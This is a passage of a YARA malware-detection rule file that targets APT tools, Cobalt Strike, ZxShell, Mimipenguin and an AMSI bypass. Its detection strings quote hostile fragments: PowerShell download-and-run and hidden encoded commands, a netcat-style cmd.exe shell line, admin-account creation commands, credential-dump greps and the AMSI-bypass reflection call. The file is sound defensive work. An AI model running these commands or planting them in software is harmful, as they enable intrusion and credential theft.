      $s8 = "?ReflectiveLoader@@YGKPAX@Z" fullword ascii
      $s9 = "%s -k %s" fullword wide
      $s10 = "ERROR in %S/%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 5 of ( $s* ) )
} 

rule WiltedTulip_Windows_UM_Task_RID31C5 : APT DEMO T1053 T1085 T1136 {
   meta:
      description = "Detects a Windows scheduled task as used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 13:36:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1053, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $r1 = "<Command>C:\\Windows\\syswow64\\rundll32.exe</Command>" fullword wide
      $p1 = "<Arguments>\"C:\\Users\\public\\" wide
      $c1 = "svchost64.swp\",checkUpdate" wide ascii
      $c2 = "svchost64.swp,checkUpdate" wide ascii
   condition: 
      ( $r1 and $p1 ) or 1 of ( $c* )
} 

rule WiltedTulip_WindowsTask_RID3065 : APT DEMO T1136 {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip - Windows Tasks"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 12:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "<Command>C:\\Windows\\svchost.exe</Command>" fullword wide
      $x2 = "<Arguments>-nop -w hidden -encodedcommand" wide
      $x3 = "-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA" 
   condition: 
      1 of them
} 

rule WiltedTulip_tdtess_RID2E7E : APT DEMO EXE FILE T1035 T1136 {
   meta:
      description = "Detects malicious service used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 11:16:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1035, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "d2lubG9naW4k" fullword wide
      $x2 = "C:\\Users\\admin\\Documents\\visual studio 2015\\Projects\\Export\\TDTESS_ShortOne\\WinService Template\\" ascii
      $s1 = "\\WinService Template\\obj\\x64\\x64\\winlogin" ascii
      $s2 = "winlogin.exe" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them ) )
} 

rule WiltedTulip_SilverlightMSI_RID315D : APT DEMO T1086 T1136 {
   meta:
      description = "Detects powershell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 13:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".\\Get_AD_Users_Logon_History.ps1 -MaxEvent" fullword ascii
      $x2 = "if ((Resolve-dnsname $_.\"IP Address\" -Type PTR -TcpOnly -DnsOnly -ErrorAction \"SilentlyContinue\").Type -eq \"PTR\")" fullword ascii
      $x3 = "$Client_Name = (Resolve-dnsname $_.\"IP Address\" -Type PTR -TcpOnly -DnsOnly).NameHost  " fullword ascii
      $x4 = "########## Find the Computer account in AD and if not found, throw an exception ###########" fullword ascii
   condition: 
      ( filesize < 20KB and 1 of them )
} 

rule WiltedTulip_matryoshka_Injector_RID33C7 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 15:02:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "Injector.dll" fullword ascii
      $s2 = "ReflectiveLoader" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them ) or ( pe.exports ( "__dec" ) and pe.exports ( "_check" ) and pe.exports ( "_dec" ) and pe.exports ( "start" ) and pe.exports ( "test" ) )
} 

rule WiltedTulip_Zpp_RID2D21 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects hack tool used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 10:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[ERROR] Error Main -i -s -d -gt -lt -mb" fullword wide
      $x2 = "[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e" fullword wide
      $s1 = "LT Time invalid" fullword wide
      $s2 = "doCompressInNetWorkDirectory" fullword ascii
      $s3 = "files remaining ,total file save = " fullword wide
      $s4 = "$ec996350-79a4-477b-87ae-2d5b9dbe20fd" fullword ascii
      $s5 = "Destinition Directory Not Found" fullword wide
      $s6 = "\\obj\\Release\\ZPP.pdb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and ( 1 of ( $x* ) or 3 of them )
} 

rule WiltedTulip_Netsrv_netsrvs_RID31DD : APT DEMO EXE FILE T1085 T1136 {
   meta:
      description = "Detects sample from Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 13:40:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Process %d Created" fullword ascii
      $s2 = "%s\\system32\\rundll32.exe" fullword wide
      $s3 = "%s\\SysWOW64\\rundll32.exe" fullword wide
      $c1 = "slbhttps" fullword ascii
      $c2 = "/slbhttps" fullword wide
      $c3 = "/slbdnsk1" fullword wide
      $c4 = "netsrv" fullword wide
      $c5 = "/slbhttps" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) and 1 of ( $c* ) ) )
} 

rule CobaltStrike_ReflectiveLoader_RID3297 : APT DEMO EXE FILE S0154 T1075 T1105 T1136 {
   meta:
      description = "Detects reflective loader (Cobalt Strike)"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 14:11:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, S0154, T1075, T1105, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "powershell -nop -exec bypass -EncodedCommand \"%s\"" fullword ascii
      $x2 = "%d is an x86 process (can't inject x64 content)" fullword ascii
      $x3 = "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s" fullword ascii
      $x4 = "Failed to impersonate token from %d (%u)" fullword ascii
      $x5 = "Failed to impersonate logged on user %d (%u)" fullword ascii
      $x6 = "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 2 of them ) or pe.exports ( "_ReflectiveLoader@4" )
} 

rule WiltedTulip_Matryoshka_RAT_RID3150 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Matryoshka RAT used in Operation Wilted Tulip"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23 13:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%S:\\Users\\public" fullword wide
      $s2 = "ntuser.dat.swp" fullword wide
      $s3 = "Job Save / Load Config" fullword wide
      $s4 = ".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@" fullword ascii
      $s5 = "winupdate64.com" fullword ascii
      $s6 = "Job Save KeyLogger" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )
} 

rule Kekeo_Hacktool_RID2C94 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects Kekeo Hacktool"
      author = "Florian Roth"
      reference = "https://github.com/gentilkiwi/kekeo/releases"
      date = "2017-07-21 09:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it." fullword wide
      $x2 = "ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) ) )
} 

rule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE T1086 T1136 {
   meta:
      description = "Detects EPS Word Exploit"
      author = "Florian Roth"
      reference = "Internal Research - ME"
      date = "2017-07-19 09:45:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "word/media/image1.eps" ascii
      $s2 = "-la;7(la+" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )
} 

rule PS_AMSI_Bypass_RID2C0E : DEMO SCRIPT T1064 T1086 T1136 {
   meta:
      description = "Detects PowerShell AMSI Bypass"
      author = "Florian Roth"
      reference = "https://gist.github.com/mattifestation/46d6a2ebb4a1f4f0e7229503dc012ef1"
      date = "2017-07-19 09:32:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, SCRIPT, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')." ascii nocase
   condition: 
      1 of them
} 

rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1027 T1064 T1086 T1136 {
   meta:
      description = "Detects PowerShell AMSI Bypass"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
      date = "2017-07-19 15:27:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, OBFUS, SCRIPT, T1027, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "j\"+\"a\"+\"v\"+\"a\"+\"s\"+\"c\"+\"r\"+\"i\"+\"p\"+\"t\"" 
      $x2 = "script:https://www.dropbox.com" ascii
   condition: 
      2 of them
} 

rule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1064 T1136 T1170 {
   meta:
      description = "Detects MSHTA Bypass"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
      date = "2017-07-19 13:01:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1064, T1136, T1170"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mshtml,RunHTMLApplication" ascii
      $s2 = "new ActiveXObject(\"WScript.Shell\").Run(" ascii
      $s3 = "/c start mshta j" ascii nocase
   condition: 
      2 of them
} 

rule Unspecified_Malware_Jul17_2C_RID316E : DEMO EXE FILE MAL T1047 T1136 {
   meta:
      description = "Unspecified Malware - CN relation"
      author = "Florian Roth"
      reference = "https://goo.gl/CX3KaY"
      date = "2017-07-18 13:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%AllUsersProfile%\\DeviceSync\\m.exe" fullword wide
      $x2 = "freenow.chickenkiller.com" fullword ascii
      $x3 = "\\Release\\PhantomNet-SSL.pdb" ascii
      $s1 = "SELECT * FROM AntiVirusProduct" fullword ascii
      $s2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%08X-%04X-%04X-%02X%02X%02X%02X" fullword ascii
      $s3 = "Proxy-Authenticate: Basic" fullword ascii
      $s4 = "Proxy-Authenticate: NTLM" fullword ascii
      $s5 = "Root\\SecurityCenter2" fullword wide
      $s6 = "aaabbbcccddd" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( all of them )
} 

rule POSHSPY_Malware_RID2C6F : DEMO MAL T1136 {
   meta:
      description = "Detects"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
      date = "2017-07-15 09:49:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "function sWP($cN, $pN, $aK, $aI)" fullword ascii
      $x2 = "$aeK = [byte[]] (0x69, 0x87, 0x0b, 0xf2" ascii
      $x3 = "(('variant', 'excretions', 'accumulators', 'winslow', 'whistleable', 'len'," 
      $x4 = "$cPairKey = \"BwIAAACkAABSU0EyAAQAAAEAA" 
      $x5 = "$exeRes = exePldRoutine" 
      $x6 = "ZgB1AG4AYwB0AGkAbwBuACAAcAB1AHIAZgBDAHIA" 
   condition: 
      1 of them
} 

rule CHAOS_Payload_RID2BA8 : DEMO EXE FILE HKTL {
   meta:
      description = "Detects a CHAOS back connect payload"
      author = "Florian Roth"
      reference = "https://github.com/tiagorlampert/CHAOS"
      date = "2017-07-15 09:15:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = { 2F 43 48 41 4F 53 00 02 73 79 6E 63 2F 61 74 6F 6D 69 63 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and all of them )
} 

rule SecurityXploded_Producer_String_RID33B2 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects hacktools by SecurityXploded"
      author = "Florian Roth"
      reference = "http://securityxploded.com/browser-password-dump.php"
      date = "2017-07-13 14:58:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "http://securityxploded.com" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and all of them )
} 

rule WinPayloads_Payload_RID2EA5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects WinPayloads Payload"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/Winpayloads"
      date = "2017-07-11 11:23:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "bpayload.exe.manifest" fullword ascii
      $s2 = "spayload" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and all of them )
} 

rule WinPayloads_PowerShell_RID2FE0 : DEMO HKTL SCRIPT T1086 T1136 {
   meta:
      description = "Detects WinPayloads PowerShell Payload"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/Winpayloads"
      date = "2017-07-11 12:15:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SCRIPT, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHBqCCA9AwggPMAgEAMIIDxQYJKoZIhvcNAQcBMBwGCiqGSIb3D" ascii
      $x2 = "powershell -w hidden -noni -enc SQBF" fullword ascii nocase
      $x3 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA" ascii
      $x4 = "powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA" ascii
   condition: 
      filesize < 10KB and 1 of them
} 

rule ZxShell_Related_Malware_CN_Group_Jul17_1_RID3601 : APT CHINA DEMO EXE FILE MAL T1050 T1087 T1136 {
   meta:
      description = "Detects a ZxShell related sample from a CN threat group"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/cat-phishing/"
      date = "2017-07-08 16:37:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, MAL, T1050, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "CMD.EXE /C NET USER GUEST /ACTIVE:yes && NET USER GUEST ++++++" ascii
      $x2 = "system\\cURRENTcONTROLSET\\sERVICES\\tERMSERVICE" fullword ascii
      $x3 = "\\secivreS\\teSlortnoCtnerruC\\METSYS" fullword ascii
      $x4 = "system\\cURRENTCONTROLSET\\cONTROL\\tERMINAL sERVER" fullword ascii
      $x5 = "sOFTWARE\\mICROSOFT\\iNTERNET eXPLORER\\mAIN" fullword ascii
      $x6 = "eNABLEaDMINtsREMOTE" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )
} 

rule ZxShell_Related_Malware_CN_Group_Jul17_2_RID3602 : APT CHINA DEMO EXE FILE MAL T1077 T1136 {
   meta:
      description = "Detects a ZxShell related sample from a CN threat group"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/cat-phishing/"
      date = "2017-07-08 16:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, MAL, T1077, T1136"
      minimum_yara = "1.7"
      
   strings:
      $u1 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)" fullword ascii
      $u2 = "User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)" fullword ascii
      $u3 = "User-Agent:Mozilla/5.0 (X11; U; Linux i686; en-US; re:1.4.0) Gecko/20080808 Firefox/%d.0" fullword ascii
      $u4 = "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
      $x1 = "\\\\%s\\admin$\\g1fd.exe" fullword ascii
      $x2 = "C:\\g1fd.exe" fullword ascii
      $x3 = "\\\\%s\\C$\\NewArean.exe" fullword ascii
      $s0 = "at \\\\%s %d:%d %s" fullword ascii
      $s1 = "%c%c%c%c%ccn.exe" fullword ascii
      $s2 = "hra%u.dll" fullword ascii
      $s3 = "Referer: http://%s:80/http://%s" fullword ascii
      $s5 = "Accept-Language: zh-cn" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of them )
} 

rule ZxShell_Related_Malware_CN_Group_Jul17_3_RID3603 : APT CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects a ZxShell related sample from a CN threat group"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/cat-phishing/"
      date = "2017-07-08 16:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%s\\nt%s.dll" fullword ascii
      $s2 = "RegQueryValueEx(Svchost\\netsvcs)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )
} 

rule ZxShell_Jul17_RID2BCD : APT DEMO T1007 T1136 {
   meta:
      description = "Detects a ZxShell - CN threat group"
      author = "Florian Roth"
      reference = "https://blogs.rsa.com/cat-phishing/"
      date = "2017-07-08 09:22:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1007, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "zxplug -add" fullword ascii
      $x2 = "getxxx c:\\xyz.dll" fullword ascii
      $x3 = "downfile -d c:\\windows\\update.exe" fullword ascii
      $x4 = "-fromurl http://x.x.x/x.dll" fullword ascii
      $x5 = "ping 127.0.0.1 -n 7&cmd.exe /c net start %s" fullword ascii
      $x6 = "ZXNC -e cmd.exe x.x.x.x" fullword ascii
      $x7 = "(bind a cmdshell)" fullword ascii
      $x8 = "ZXFtpServer 21 20 zx" fullword ascii
      $x9 = "ZXHttpServer" fullword ascii
      $x10 = "c:\\error.htm,.exe|c:\\a.exe,.zip|c:\\b.zip\"" fullword ascii
      $x11 = "c:\\windows\\clipboardlog.txt" fullword ascii
      $x12 = "AntiSniff -a wireshark.exe" fullword ascii
      $x13 = "c:\\windows\\keylog.txt" fullword ascii
   condition: 
      ( filesize < 10000KB and 1 of them ) or 3 of them
} 

rule mimipenguin_1_RID2C43 : DEMO FILE HKTL T1136 {
   meta:
      description = "Detects Mimipenguin hack tool"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-07-08 09:41:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "self._strings_dump += strings(dump_process(target_pid))" fullword ascii
      $x2 = "def _dump_target_processes(self):" fullword ascii
      $x3 = "self._target_processes = ['sshd:']" fullword ascii
      $x4 = "GnomeKeyringPasswordFinder()" ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )
} 

rule mimipenguin_2_RID2C44 : DEMO FILE HKTL T1136 {
   meta:
      description = "Detects Mimipenguin hack tool"
      author = "Florian Roth"
      reference = "https://github.com/huntergregal/mimipenguin"
      date = "2017-07-08 09:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "DUMP=$(strings \"/tmp/dump.${pid}\" | grep -E" fullword ascii
      $x2 = "strings /tmp/apache* | grep -E '^Authorization: Basic.+=$'" fullword ascii
      $x3 = "grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A" fullword ascii
      $x4 = "strings \"/tmp/dump.${pid}\" | grep -E -m 1 '^\\$.\\$.+\\$')\"" fullword ascii
      $x5 = "if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of them )
} 

rule Gen_Net_LocalGroup_Administrators_Add_Command_RID38C1 : DEMO EXE FILE GEN SUSP {
   meta:
      description = "Detects an executable that contains a command to add a user account to the local administrators group"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-07-08 18:34:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, GEN, SUSP"
      minimum_yara = "2.2.0"
      
   strings:
      $x1 = /net localgroup administrators [a-zA-Z0-9]{1,16} \/add/ nocase ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them )
} 

rule HDRoot_Sample_Jul17_1_RID2E84 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects HDRoot samples"
      author = "Florian Roth"
      reference = "Winnti HDRoot VT"
      date = "2017-07-07 11:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "gleupdate.dll" fullword ascii
      $s2 = "\\DosDevices\\%ws\\system32\\%ws" fullword wide
      $s3 = "l\\Driver\\nsiproxy" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them )
} 

rule HDRoot_Sample_Jul17_2_RID2E85 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects HDRoot samples"
      author = "Florian Roth"
      reference = "Winnti HDRoot VT"
      date = "2017-07-07 11:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "http://microsoftcompanywork.htm" fullword ascii
      $x2 = "compose.aspx?s=%4X%4X%4X%4X%4X%4X" fullword ascii
      $t1 = "http://babelfish.yahoo.com/translate_url?" fullword ascii
      $t2 = "http://translate.google.com/translate?prev=hp&hl=en&js=n&u=%s?%d&sl=es&tl=en" fullword ascii
      $u1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.5." ascii
      $u2 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)" fullword ascii
      $u3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon; TERA:" fullword ascii
      $s1 = "\\system32\\ntoskrnl.exe" fullword ascii
      $s2 = "Schedsvc.dll" fullword wide
      $s3 = "dllserver64.dll" fullword ascii
      $s4 = "C:\\TERA_SR.txt" fullword ascii
      $s5 = "updatevnsc.dat" fullword wide
      $s6 = "tera dll service global event" fullword ascii
      $s7 = "Referer: http://%s/%s" fullword ascii
      $s8 = "tera replace dll config" fullword ascii
      $s9 = "SetupDll64.dll" fullword ascii
      $s10 = "copy %%ComSpec%% \"%s\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 1 of ( $x* ) or all of ( $u* ) or 8 of them )
} 

rule Unspecified_Malware_Jul17_1A_RID316B : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects samples of an unspecified malware - July 2017"
      author = "Florian Roth"
      reference = "Winnti HDRoot VT"
      date = "2017-07-07 13:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%SystemRoot%\\System32\\wuauserv.dll" fullword ascii
      $s2 = "systemroot%\\system32\\wuauserv.dll" fullword ascii
      $s3 = "ocgen.logIN" fullword wide
      $s4 = "ocmsn.logIN" fullword wide
      $s5 = "Install.log" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them )
} 

rule Disclosed_0day_POCs_exploit_RID3190 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 13:27:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\exploit.pdb" ascii
      $x2 = "\\favorites\\stolendata.txt" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them )
} 

rule Disclosed_0day_POCs_shellcodegenerator_RID3605 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07 16:38:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\shellcodegenerator.pdb" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them )
} 

rule Molerats_Jul17_Sample_1_RID2F9B : APT DEMO EXE FILE G0021 T1136 {
   meta:
      description = "Detects Molerats sample - July 2017"
      author = "Florian Roth"
      reference = "https://mymalwareparty.blogspot.de/2017/07/operation-desert-eagle.html"
      date = "2017-07-07 12:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0021, T1136"
      minimum_yara = "1.7"
      
   strings:
